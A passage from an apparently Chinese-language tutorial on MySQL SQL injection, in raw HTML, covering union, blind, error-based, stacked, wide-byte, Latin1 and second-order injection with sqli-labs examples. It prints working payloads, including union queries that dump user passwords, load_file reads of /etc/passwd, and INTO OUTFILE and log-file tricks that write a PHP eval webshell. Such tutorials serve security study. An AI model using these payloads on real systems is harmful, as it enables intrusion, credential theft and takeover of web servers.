group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</span><br><span class="line"></span><br><span class="line">### 查看当前数据库版本</span><br><span class="line"></span><br><span class="line">- VERSION()</span><br><span class="line">- @@VERSION</span><br><span class="line">- @@GLOBAL.VERSION</span><br><span class="line"></span><br><span class="line">### 当前登录用户</span><br><span class="line"></span><br><span class="line">- USER()</span><br><span class="line">- CURRENT_USER()</span><br><span class="line">- SYSTEM_USER()</span><br><span class="line">- SESSION_USER()</span><br><span class="line"></span><br><span class="line">### 当前使用的数据库</span><br><span class="line"></span><br><span class="line">- DATABASE()</span><br><span class="line">- SCHEMA()</span><br><span class="line"></span><br><span class="line">### 当前的操作系统</span><br><span class="line"></span><br><span class="line">- @@version_compile_os</span><br><span class="line"></span><br><span class="line">### 常用语句</span><br><span class="line"></span><br><span class="line">#### 查找所有用户</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;sql</span><br><span class="line">select group_concat(user) from mysql.user;</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
<h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata;</span><br></pre></td></tr></table></figure>

<h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;database_name&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出来</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.table_constraints <span class="keyword">where</span> table_schema=<span class="string">&#x27;database_name&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;xxx&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT load_file(&#39;&#x2F;etc&#x2F;passwd&#39;);</span><br></pre></td></tr></table></figure>

<h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">CopySELECT &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; into outfile &#x27;/var/www/html/shell.php&#x27;;</span><br></pre></td></tr></table></figure>







<hr>
<h2 id="常见类型及绕过方法"><a href="#常见类型及绕过方法" class="headerlink" title="常见类型及绕过方法"></a>常见类型及绕过方法</h2><p>根据不同的分类方法有不同的类型，根据注入点可以简单分为数字形、字符型、搜索型，这里我们按照执行的方法来分类，其中最常见的是联合查询注入、盲注和报错注入，此外还有宽字节注入、堆叠注入、二次注入、正则注入、http头部注入、异或注入等</p>
<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>即利用union select拼接语句来完成查询。步骤如下：</p>
<ol>
<li><p>确定注入点。</p>
<p>使用一些尝试的语句来找到注入点，确定我们可以插入联合查询语句的位置。</p>
</li>
<li><p>确定字段的数量。</p>
<p>使用<code>order/group by</code>语句，往后边拼接数字来确定字段数量，若大于该数字时页面错误/无内容，小于或等于时页面正常，则字段数量即为该数字。若错误页与正常页一样，联合查询注入可能并不好用，我们就要考虑使用别的方法。</p>
</li>
<li><p>判断页面回显数据的字段位置。</p>
<p>使用<code>union select 1,2,3,4,...</code> 通过显示在页面上的数字，即可判断出页面显示的字段位置，我们就在该位置来查询数据。这里后面的字段数一定要与我们前面字段的数量相同，因为union语句要求前后必须返回相同数量的列，否则语句就无法执行。</p>
<p>有时当我们确定页面有回显，可页面中并没有我们想看到的数字时，可能是因为页面限制了只输出单行数据，这时我们要把前面的字段都改为<code>NULL</code>来防止对后面造成影响。</p>
</li>
<li><p>拼接查询语句查询数据。</p>
<p>我们来拿sqli-labs的less1举个例子。</p>
<p>前三步都执行过后，我们来查询数据库。</p>
<p><code>http://localhost/sqli-labs/Less-1/?id=-1&#39; union select 1,database(),3 --+</code></p>
<p>得知数据库名字叫做security后我们来查询数据表。</p>
<p><code>http://localhost/sqli-labs/Less-1/?id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
<p>然后我们选取其中一个叫users的表来查询它的列。</p>
<p><code>http://localhost/sqli-labs/Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
<p>我们接着选取其中叫password的列来查询其中的字段值都是什么。</p>
<p><code>http://localhost/sqli-labs/Less-1/?id=-1&#39; union select 1,group_concat(password),3 from security.users --+</code></p>
<p>这样我们就成功得到了数据库中用户的密码数据。</p>
</li>
</ol>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>当页面并不能直接回显我们想要得到的数据时，我们可以考虑使用盲注。</p>
<p>盲注的思路就是利用or等逻辑连接词或者if函数来让语句做一个判断，通过观察页面与原本返回的内容/响应时间不同来得出数据内容。</p>
<p>盲注主要分为时间盲注和布尔盲注。</p>
<p>我们先利用<code>and1=2</code>,<code>or1=1</code>这两个永真和永假的句子分别做尝试，当页面对这两种情况的响应页面有较明显的区分时，我们可以采用布尔盲注，否则可以考虑时间盲注。</p>
<p>盲注的好处是适用范围较为广泛，缺点就是耗时长，手工注入工作量会很大，一般要结合工具或者编写脚本来完成自动化注入。</p>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>道理很简单，我们可以使语句中的条件为假（假的嘛，随便找一个肯定不对的就好了，肯定要比找一定为真的要容易些）后面用or来拼接我们要判断的语句，当其为真时整个条件也为真，页面就会返回结果为真的响应，反之则会返回结果为假的反应，通过不断地判断来得知数据库的数据。</p>
<p>例如通过以下语句来判断数据库长度和其第一位的字符：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=asdhagsuifhafas <span class="keyword">or</span> <span class="keyword">length</span>(<span class="keyword">database</span>())&gt;<span class="number">8</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=asdhagsuifhafas <span class="keyword">or</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))&lt;<span class="number">130</span></span><br></pre></td></tr></table></figure>

<p>这里我们一般使用二分法来更加快速地得到字符的结果。    </p>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>当在真假两种条件时页面返回的信息并不能区分出来的时候，我们就可以利用sleep()函数，通过观察页面响应的时间差异来进行判断，其原理和布尔盲注是一样的，适用范围要更广一些，但更加耗费时间，工作量变得更大了。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=asdhagsuifhafas <span class="keyword">or</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))&lt;<span class="number">130</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p>如果前面的条件为真的话，这里就会延迟5s，然后再显示页面结果。要注意在手工注入时注意这个时间的把握，太短可能会因为服务器加载出现误差，太长会影响效率。</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入是一种适用范围也比较广泛的方法，原理是利用一些特殊函数的错误使用来使参数被页面输出出来。可以使用的前提是服务器的报错信息选项要打开。</p>
<p>常见的利用函数有：<code>exp()、floor()+rand()、updatexml()、extractvalue()</code>，此外还有一些冷门的<code>geometrycollection()、multipoint()</code>等，就不再展开了。</p>
<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><blockquote>
<p>​    <code>ExtractValue(xml_frag, xpath_expr)</code></p>
<p><code>ExtractValue()</code>接受两个字符串参数，一个XML标记片段 <em>xml_frag</em>和一个XPath表达式 <em>xpath_expr</em>（也称为 定位器）; 它返回<code>CDATA</code>第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</p>
<p>——引自php官方文档</p>
</blockquote>
<p>我们可以知道，这里的第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径。而如果我们这里Xpath格式书写错误的话，这里就会报错，并且还会把查询信息放在报错里。这里这样报错的原因比较复杂，也没有查到具体的解释，我们先学会怎么使用就好。</p>
<p>来个payload示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x5c,(<span class="keyword">select</span> <span class="keyword">database</span>(),<span class="number">0x5c</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>因为后面的格式错误，所以我们会查询出数据库的名字，这里加入0x5c（正斜杠）是为了在爆出多条数据时当作分割线来作区分。</p>
<p>注：<code>ExtractValue()</code>和<code>UpdateXML()</code>都是在MySQL 5.1.5版本中才被加入的，故低于该版本的MySQL是无法使用该方法的。</p>
<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><blockquote>
<p><code>UpdateXML(xml_target, xpath_expr, new_xml)</code></p>
<p><strong>xml_target:：</strong> 需要操作的xml片段</p>
<p><strong>xpath_expr：</strong> 需要更新的xml路径(Xpath格式)</p>
<p><strong>new_xml：</strong> 更新后的内容</p>
<p>此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 <em>xml_target</em> 新的XML片段 <em>new_xml</em> ，然后返回更改的XML。<em>xml_target</em>替换的部分 与<em>xpath_expr</em> 用户提供的XPath表达式匹配</p>
<p>——引自php官方文档</p>
</blockquote>
<p>和前面同理，只是多了一个参数，我们多加一个就好。</p>
<p>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x5c</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x5c</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><blockquote>
<p><code>exp(x)</code></p>
<p>返回e的不同次方</p>
<p>x：指数</p>
<p>——引自菜鸟教程</p>
</blockquote>
<p><code>exp()</code>的报错原理是mysql能记录的double数值范围有限，当参数的值过高时，由于指数增长是很快的，得到的值就会超过double的范围，从而报错，如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(<span class="number">1000</span>)</span><br><span class="line">&gt; <span class="keyword">DOUBLE</span> <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> <span class="keyword">range</span> <span class="keyword">in</span> <span class="string">&#x27;exp(1000)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>所以我们利用该点，构造payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select exp(~(select * from (select users())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((<span class="keyword">select</span> <span class="string">&#x27;root@localhost&#x27;</span> <span class="keyword">from</span> dual)))<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这里的<del>是sql中的运算符，意为一元字符反转，而0按位取反就会返回“<code>18446744073709551615</code>”，而函数成功执行后就会返回0，所以我们输入`</del>(select database())<code>会返回</code>18446744073709551615`，显然是会超过范围报错的。这里需要嵌套两层子查询，一层不行，原因是什么我还没有搞明白，求大佬指点。</p>
<p>版本需在MySQL 5.5.5及其以上。</p>
<h4 id="floor-rand"><a href="#floor-rand" class="headerlink" title="floor()+rand()"></a>floor()+rand()</h4><blockquote>
<p>rand() 是一个随机函数，通过一个固定的随机数的种子0之后，可以形成固定的伪随机序列。</p>
<p>floor() 函数的作用就是返回小于等于括号内该值的最大整数，也就是取整。</p>
<p>group by 主要用来对数据进行分组（相同的分为一组）。</p>
<p>count(*)用于对数据进行整合计数。</p>
<p>——内容及下四图引自freebuf<a href="https://www.freebuf.com/column/235496.html">《Mysql报错注入之floor(rand(0)*2)报错原理探究》</a></p>
</blockquote>
<p>完整的payload如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="number">2</span>,<span class="keyword">concat</span>(<span class="number">0x5c</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x5c</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a</span><br></pre></td></tr></table></figure>

<p>我们把它分割开来理解。</p>
<p>首先，<code>rand(0)</code>的意思是选择一个固定的随机数种子0，从而形成一个我们可以预见的伪随机序列。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">rand(0)																												0.15522042769493574</span><br><span class="line">		0.620881741513388</span><br><span class="line">		0.6387474552157777</span><br><span class="line">		0.33109208227236947</span><br><span class="line">		0.7392180764481594</span><br><span class="line">		0.7028141661573334</span><br></pre></td></tr></table></figure>

<p>然后，我们用<code>floor()</code>函数取整，<code>floor(rand(0)*2)</code>就是对<code>rand(0)</code>产生的随机序列乘2，再取整，从而得到一个固定的序列，而这个序列刚好是011011这个顺序不断循环。这就是我们选择<code>rand(0)</code>的原因，不会出现一直都是0或1的情况。</p>
<p>as a就是把前面整个的结果看作是a，方便我们后面用。</p>
<p>然后我们在后面拼接<code>group by</code>语句。这里作个示例，我们先作一张表，不加<code>group by</code>的结果如下：（as a/x 前面的as省略了）</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.1/sqli/sqli_image2.jpg"></p>
<p>然后我们加上<code>group by x</code>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.1/sqli/sqli_image3.jpg"></p>
<p>我们可以看到<code>group by</code>会将相同名字的合并，然后按照ascii排序。</p>
<p>最后我们加上<code>count(*)</code>，如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.1/sqli/sqli_image4.jpg"></p>
<p>这里的x其实就是每一类的数量。</p>
<p>那么为什么这个句子会报错呢？</p>
<p>这里关键的是要理解group by函数的工作过程。<code>group by key</code> 在执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则更新临时表中的数据(更新数据时，不再计算rand值)；如果该key不存在于临时表中，则在临时表中插入key所在行的数据(插入数据时，会再计算rand值)。如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果为1，就会导致插入时冲突而报错。也就是说，检测时和插入时计算了两次随机数的值导致了错误。</p>
<p>下图非常直观，我们第一次查询0发现不存在，于是插入新的key，此时随机数会重新计算，于是插入了key1，然后第二条查询中有key1，不会再计算，第三条查询时key0没有数据，于是插入新的key，此时重新计算，结果又成了1，于是插入的新数据与第一条数据冲突了，就会报错。这就是我们要用<code>rand(0)</code>的原因，随机数稳定，可以很快就报错。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.1/sqli/sqli_image1.jpg"></p>
<h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><p><strong>利用SQL注入可以导入导出文件，获取文件的内容，或者修改文件的内容。</strong></p>
<blockquote>
<p>讲Mysql文件读写之前，先要了解什么是file_priv和secure-file-priv</p>
<p>file_priv是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述payload查询权限。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select file_priv from mysql.user where user&#x3D;$USER host&#x3D;$HOST;</span><br></pre></td></tr></table></figure>

<p>secure-file-priv是一个系统变量，对于文件读/写功能进行限制。具体如下：<br>无内容，表示无限制。</p>
<ul>
<li>为NULL，表示禁止文件读/写。</li>
<li>为目录名，表示仅允许对特定目录的文件进行读/写。</li>
</ul>
<p>TIPS：5.5.53本身及之后的版本默认值为NULL，之前的版本无内容。<br>三种方法查看当前secure-file-priv的值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select @@secure_file_priv;</span><br><span class="line">select @@global.secure_file_priv;</span><br><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>

<p>两个参数的修改：<br>通过修改my.ini文件，添加：secure-file-priv=<br>启动时添加参数：mysqld.exe –secure-file-priv=</p>
<p>——引自 ttpfx《MySQL注入进阶》</p>
</blockquote>
<ul>
<li><p><strong>读取文件</strong></p>
<p>读文件通常使用load_file函数，语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(file_path);</span><br><span class="line"></span><br><span class="line">SELECT LOAD_FILE(&#39;&#x2F;etc&#x2F;passwd&#39;);</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>LOAD_FILE的默认目录是<code>@@datadir</code></li>
<li>文件必须是当前用户可读</li>
<li>需要知道文件的绝对物理路径</li>
<li>读文件必须小于<code>max_allowed_packet</code>，为1047552byte, 可用<code>SELECT @@max_allowed_packet</code>语句来查看文件读取最大值</li>
</ul>
</li>
</ul>
<ul>
<li><p><strong>向文件写入webshell</strong></p>
<p>写入后可配合蚁剑等工具操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT  &quot;&lt;?php eval($_POST[&#39;a&#39;])?&gt;&quot; INTO OUTFILE &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;;</span><br><span class="line">SELECT  &quot;&lt;?php eval($_POST[&#39;a&#39;])?&gt;&quot; into DUMPFILE &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;NTO OUTFILE函数写文件时会在每一行的结束自动加上换行符 </span><br><span class="line">&#x2F;&#x2F;INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择 </span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>需要知道网站的绝对物理路径，这样导出后的webshell才可访问</li>
<li>对需导出的目录要有可写权限。</li>
</ul>
</li>
</ul>
<ul>
<li><p><strong>日志法</strong></p>
<p>由于mysql在5.5.53版本之后，<code>secure-file-priv</code>的值默认为<code>NULL</code>，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。</p>
<p>mysql日志文件的一些相关权限可以直接通过命令来修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;请求日志</span><br><span class="line">mysql&gt; set global general_log_file &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;</span><br><span class="line">mysql&gt; set global general_log &#x3D; on;</span><br><span class="line">&#x2F;&#x2F;慢查询日志</span><br><span class="line">mysql&gt; set global slow_query_log_file&#x3D;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;2.php&#39;</span><br><span class="line">mysql&gt; set global slow_query_log&#x3D;1;</span><br><span class="line">&#x2F;&#x2F;还有其他很多日志都可以进行利用</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>之后我们在让数据库执行满足记录条件的恶意语句即可。</p>
<p>注意：</p>
<ul>
<li>权限够，可以进行日志的设置操作</li>
<li>知道目标目录的绝对路径</li>
</ul>
</li>
</ul>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>顾名思义，就是将多个语句“堆”在一起执行。</p>
<p>当我们使用联合注入查询的时候，我们不仅必须要返回相同的字段数，还被限制只能执行select一类的语句。而堆叠注入中，因为分号<code>;</code>是MySQL语句的结束符，我们就可以利用分号来在后面执行其它增、删、改等恶意语句。攻击方法很直接，可其局限性也很明显，因为并不是每一个环境下都可以执行，可能受到数据库引擎不支持等的限制，或者直接权限不足。谁又会让你随便删改他的数据库呢？</p>
<p>一些常见的增删查改payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">like</span> <span class="keyword">users</span>;   </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;<span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">test</span>;                </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="string">&#x27;100&#x27;</span>,<span class="string">&#x27;new&#x27;</span>,<span class="string">&#x27;new&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">&#x27;c:/tmpupbbn.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>堆叠注入巧妙的使用方法是，当我们通过不断查询猜测到其源码中的SQL语句时，可以考虑通过修改表/列名来利用原语句实现注入。</p>
<p>如我们知道了其语句是<code>select * from users where id = &#39;&#39;;</code>我们就可以使用堆叠注入，如<code>alter table flag rename to users;</code>把flag表的名字修改为users，然后再利用<code>1 or 1=1 #</code>恒真语句来进行查询。注意修改前先把原来的表修改成其他名字，否则出现重名会报错。</p>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>该方法的原理是，MySQL在使用 GBK 编码的时候，会把两个字符当作 一个汉字，例如<code>%aa%5c</code> 就是一个汉字(前一个 ascii 码大于 128 才能到汉字的范围)。而在过滤 ’ 的时候，往往利用的思路是将 <code>&#39;</code> 转换为 <code>\&#39;</code> ，例如常见的<code>addslashes()</code>函数。 因此我们可以用这个办法将 <code>&#39;</code> 前面添加的 <code>\</code> 除掉，从而成功绕过。</p>
<p>一般我们有两种思路： </p>
<p>1、<code>%df</code> 吃掉 <code>\</code> </p>
<p> urlencode(\‘) = %5c%27，我们在%5c%27 前面添加%df，形 </p>
<p>成%df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此 </p>
<p>事%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，脱离了反斜杠，从而达到我们的目的。 </p>
<p>2、将 <code>\&#39;</code> 中的 <code>\ </code>过滤掉，例如可以构造 <code>%**%5c%5c%27</code> 的情况，后面的%5c 会被前面的%5c </p>
<p>给注释掉。</p>
<p>payload示例:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=-1%df%27union%20select%201,user(),3<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>这里我们添加了一个%df,源码中的<code>addslashes()</code>函数生成的前面的<code>%5c</code>就被它吃掉了，<code>&#39;</code> 即可绕过。</p>
<h3 id="Latin1编码相关"><a href="#Latin1编码相关" class="headerlink" title="Latin1编码相关"></a>Latin1编码相关</h3><p>也不算一个方法吧，算一个小技巧，不过因为与宽字节注入相似，就放在一起吧。</p>
<p>如当我们要登录admin这个用户名，而代码中出现了类似下面的限制时：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们就可以利用Latin1编码来做文章。</p>
<p>MySQL的默认编码是Latin1，而php的编码不是（一般为utf8）。因为latin1并不支持汉字，所以我们可以让utf8汉字转换成latin1，而当Mysql在转换字符集的时候，会将不完整的字符给忽略掉。如 <code>佬</code> 这个字的UTF-8编码是\xE4\xBD\xAC，如果我们完整输入<code>username=admin%e4%bd%ac</code>，就会报错，而如果我们只输入<code>username=admin%e4</code>，其中的<code>%e4</code>就会被MySQL忽略，从而让我们成功登录admin。</p>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入适用于绝对信任用户数据，在引用用户数据的时候并没有进行过滤的页面，即使它在录入用户数据时使用了<code>mysql_real_escape_string</code>类似函数进行过滤，也会被我们二次注入。过程主要分为两步，第一步先向数据库插入恶意语句，然后再将其引用出来，使恶意语句得到执行。</p>
<p>我们用sqli-labs的less24举个例子来具体理解。</p>
<p>在这个页面中，我们可以做的操作是用正确的用户名和密码来登录，也可以创建一个新用户，还可以在登陆后修改密码。</p>
<p>我们先来看<code>login.php</code>的源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   $username = mysql_real_escape_string($_POST[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   $password = mysql_real_escape_string($_POST[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line">   $sql = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span></span><br><span class="line">   $res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>然后我们来看<code>login_create.php</code>中部分源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="comment"># Validating the user input........</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//$username=  $_POST[&#x27;username&#x27;] ;</span></span><br><span class="line">	$username=  mysql_escape_string($_POST[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line">	$pass= mysql_escape_string($_POST[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">	$re_pass= mysql_escape_string($_POST[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;</span>;</span><br><span class="line">	$sql = <span class="string">&quot;select count(*) from users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">	$res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">  	$row = mysql_fetch_row($res);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//print_r($row);</span></span><br><span class="line">	<span class="keyword">if</span> (!$row[<span class="number">0</span>]== <span class="number">0</span>) </span><br><span class="line">		&#123;</span><br><span class="line">		<span class="meta">?&gt;</span></span><br><span class="line">		&lt;script&gt;alert(<span class="string">&quot;The username Already exists, Please choose a different username &quot;</span>)&lt;/script&gt;;</span><br><span class="line">		</span><br></pre></td></tr></table></figure>

<p>而看到这里<code>pass_change.php</code>中引用用户名的时候并没有使用<code>mysql_real_escape_string</code>，我们就可以利用这一点进行二次注入。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;	</span><br><span class="line">	<span class="comment"># Validating the user input........</span></span><br><span class="line">	$username= $_SESSION[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">	$curr_pass= mysql_real_escape_string($_POST[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">	$pass= mysql_real_escape_string($_POST[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">	$re_pass= mysql_real_escape_string($_POST[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>($pass==$re_pass)</span><br><span class="line">	&#123;	</span><br><span class="line">		$sql = <span class="string">&quot;UPDATE users SET 